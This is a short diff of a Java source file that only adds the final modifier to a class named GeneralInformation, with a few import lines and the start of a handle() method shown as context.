@@ -7,7 +7,7 @@ import org.json.updated.parsers.util.JSONBuilder;
 import java.awt.*;
 import java.awt.datatransfer.DataFlavor;
 
-public class GeneralInformation implements JSONObject {
+public final class GeneralInformation implements JSONObject {
     @Override
     public void handle() {
         String content = ">>> ";
